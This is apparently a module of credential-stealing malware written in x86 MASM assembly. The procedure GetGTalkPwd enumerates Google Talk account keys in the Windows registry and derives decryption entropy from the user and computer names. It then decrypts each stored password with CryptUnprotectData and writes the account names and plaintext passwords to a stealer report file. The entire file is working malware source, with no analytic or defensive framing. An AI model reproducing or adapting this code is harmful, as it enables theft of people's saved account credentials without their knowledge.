.data?
        GtalkBuf1     db  100h dup (?)
        GtalkBuf2     db  100h dup (?)
        GtalkPwd      db  1000h dup (?)
        GUName        db  100h dup (?)
        GCName        db  100h dup (?)
        GlDecryptData db  1000h dup (?)
        
        GDataIn              DATA_BLOB <>
        GDataOut             DATA_BLOB <>
        GOptionalEntropy     DATA_BLOB <>
     
.code

GetGTalkPwd proc
      LOCAL   WTF:DWORD
      LOCAL   gKey :DWORD
      LOCAL   index :DWORD
      LOCAL   gbufsize :DWORD
      LOCAL   b :DWORD
      LOCAL   otmp :DWORD
      LOCAL   gbufsize2 :DWORD
      
      mov     dword ptr [DataSize], 0
      mov     dword ptr [stbuf], GTALK_STEAL
      WriteFile, stfile, addr stbuf, sizeof stbuf, addr SNW, NULL
      
      push    offset stealer_seh_proc
      assume  fs : nothing
      push    dword ptr fs:[0]
      mov     dword ptr fs:[0], esp
      mov     eax, offset GetGTalkPwd_seh
      mov     seh.SafeEip, eax
      mov     seh.PrevEbp, ebp
      mov     seh.PrevEsp, esp
      SetFilePointer, stfile, 0, 0, FILE_CURRENT
      mov     dword ptr [savedfilepointer], eax
        
        lea     eax, gKey
        push    eax
        push    KEY_READ
        push    0
        push    offset GtalkReg1
        push    HKEY_CURRENT_USER
        call    dword ptr [_RegOpenKeyEx]
        test    eax, eax
        jne     gtalk_failed_1
        
        mov     dword ptr [index], 0

gtalk_enum_loop:
        RtlMoveMemory, addr EntropyData, addr GEntropyData, sizeof GEntropyData
        RtlMoveMemory, addr obase, addr Gobase, sizeof Gobase
        
        mov     gbufsize, sizeof GtalkBuf1
        xor     eax, eax
        push    eax
        push    eax
        push    eax
        push    eax
        lea     eax, gbufsize
        push    eax
        push    offset GtalkBuf1
        push    dword ptr [index]
        push    dword ptr [gKey]
        call    dword ptr [_RegEnumKeyEx]
        cmp     eax, ERROR_NO_MORE_ITEMS
        je      all_gtalk_key_done
        inc     dword ptr [index]
        
        lstrcpy, addr GtalkBuf2, addr GtalkReg1
        lstrcat, addr GtalkBuf2, addr sl
        lstrcat, addr GtalkBuf2, addr GtalkBuf1
        
        mov     byte ptr [GtalkPwd], 0
        invoke  RegRead, HKEY_CURRENT_USER, addr GtalkBuf2, addr GtalkReg2, addr GtalkPwd, sizeof GtalkPwd, REG_READ_A
        test    eax, eax
        je      gtalk_pw_is_empty
        mov     dword ptr [gbufsize2], eax
        
        lstrlen, addr GtalkPwd
        test    eax, eax
        je      gtalk_pw_is_empty
        
        mov     word ptr [GUName], 0
        mov     gbufsize, sizeof GUName
        lea     eax, gbufsize
        push    eax
        push    offset GUName
        call    _GetUserNameW
        mov     word ptr [GCName], 0
        mov     gbufsize, sizeof GCName
        GetComputerNameW, addr GCName, addr gbufsize
        lstrcatW, addr GUName, addr GCName
        
        ;blobEntropy
        pushad
        mov     dword ptr [b], 0
        lstrlenW, addr GUName
        mov     ecx, eax
        xor     ebx, ebx
gtalk_blobEntropy:
        push    ecx
        .if     b == 10h
                mov     dword ptr [b], 0
        .endif
        mov     ecx, dword ptr [b]
        mov     eax, dword ptr [EntropyData+ecx]
        mov     dword ptr [otmp], eax
        movzx   eax, word ptr [GUName+ebx]
        mov     ecx, dword ptr [obase]
        mul     ecx
        mov     ecx, dword ptr [otmp]
        xor     ecx, eax
        mov     dword ptr [otmp], ecx
        mov     eax, dword ptr [otmp]
        mov     ecx, dword ptr [b]
        mov     dword ptr [EntropyData+ecx], eax
        mov     eax, dword ptr [obase]
        imul    eax, eax, 0BC8Fh
        mov     dword ptr [obase], eax
        add     dword ptr [b], 4
        add     ebx, 2
        pop     ecx
        dec     ecx
        jnz     gtalk_blobEntropy
        popad
        
        ;blobCrypt
        mov     ecx, dword ptr [EntropyData]
        or      ecx, 1
        xor     eax, eax
gtalk_blobCrypt:
        mov     dl, byte ptr [GtalkPwd+eax+4]
        mov     bl, byte ptr [GtalkPwd+eax+5]
        add     dl, 0Fh
        sub     bl, 21h
        shl     dl, 4
        or      dl, bl
        mov     esi, eax
        sub     dl, cl
        imul    ecx, ecx, 10FF5h
        shr     esi, 1
        add     eax, 2
        mov     byte ptr [esi+GlDecryptData], dl
        cmp     eax, dword ptr [gbufsize2]
        jb      gtalk_blobCrypt
        
        shr     eax, 1
        mov     dword ptr [GDataIn.cbSize], eax
        mov     dword ptr [GDataIn.pData], offset GlDecryptData
        mov     dword ptr [GOptionalEntropy.cbSize], 10h
        mov     dword ptr [GOptionalEntropy.pData], offset EntropyData
        
        push    offset GDataOut
        push    CRYPTPROTECT_UI_FORBIDDEN
        push    0
        push    0
        push    offset GOptionalEntropy
        push    0
        push    offset GDataIn
        call    dword ptr [_CryptUnprotectData]
        test    eax, eax
        je      gtalk_pw_is_empty
        
        mov     eax, dword ptr [GDataOut.cbSize]
        test    eax, eax
        je      gtalk_pw_is_empty
        
        lstrlen, addr GtalkBuf1
        mov     dword ptr [plen], eax
        add     dword ptr [DataSize], sizeof plen
        add     dword ptr [DataSize], eax
        WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
        mov     byte ptr [data_type], REPORT_DATA_LOGIN
        add     dword ptr [DataSize], sizeof data_type
        WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
        WriteFile, stfile, addr GtalkBuf1, plen, addr SNW, NULL
      
      mov     eax, dword ptr [GDataOut.cbSize]
      mov     dword ptr [plen], eax
      add     dword ptr [DataSize], sizeof plen
      add     dword ptr [DataSize], eax
      WriteFile, stfile, addr plen, sizeof plen, addr SNW, NULL
      mov     byte ptr [data_type], REPORT_DATA_PWD
      add     dword ptr [DataSize], sizeof data_type
      WriteFile, stfile, addr data_type, sizeof data_type, addr SNW, NULL
      WriteFile, stfile, GDataOut.pData, plen, addr SNW, NULL
      
    gtalk_pw_is_empty:
      jmp     gtalk_enum_loop
      
    all_gtalk_key_done:
      push    dword ptr [gKey]
      call    dword ptr [_RegCloseKey]
    gtalk_failed_1:
      
    GetGTalkPwd_seh:
      pop     dword ptr fs:[0]
      add     esp, 4
      
      WriteFile, stfile, addr DataSize, sizeof DataSize, addr SNW, NULL
      mov     eax, dword ptr [DataSize] ; return actual size of written data
      ret
GetGTalkPwd endp
